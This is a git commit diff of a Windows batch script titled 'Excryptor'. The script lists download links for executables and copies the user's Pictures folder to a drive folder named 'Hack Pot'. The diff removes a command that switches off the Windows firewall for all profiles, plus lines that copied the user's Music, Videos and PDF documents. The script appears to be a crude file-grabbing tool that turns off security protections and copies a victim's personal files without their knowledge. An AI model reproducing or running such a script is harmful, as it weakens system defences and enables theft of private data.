0649386277b08e076b24594ea7af6dc195393394
Wilson Netto <ngmplays@gmail.com>
2017-06-04 17:12:10 -0300

    Update Backbatch.bat

--- Backbatch.bat
+++ Backbatch.bat
@@ -3,20 +3,10 @@
 # Downloads exe 
 # https://userscloud.com/nscn41hihw6q
 # https://userscloud.com/5nbjzt6qxe7i
+# Example basic of copy:
 
 @title Excryptor - Wilson Netto (C) Copyright  USER: %USERNAME% 
-netsh advfirewall set all state off
-ipconfig 
-
-@echo off
-MD "F:\Wilson Netto @ Hack Pot\Imagens\" 
-MD "F:\Wilson Netto @ Hack Pot\Videos\" 
-MD "F:\Wilson Netto @ Hack Pot\Music\" 
-MD "F:\Wilson Netto @ Hack Pot\Documents\" 
 
 xcopy "%USERPROFILE%\Pictures\*.*" "F:\Wilson Netto @ Hack Pot\Imagens"
-xcopy "%USERPROFILE%\Music\*.mp3*" "F:\Wilson Netto @ Hack Pot\Music"
-xcopy "%USERPROFILE%\Videos\*.*" "F:\Wilson Netto @ Hack Pot\Videos"
-xcopy "%USERPROFILE%\Documents\*.pdf*" "F:\Wilson Netto @ Hack Pot\Documents"
 
 PAUSE
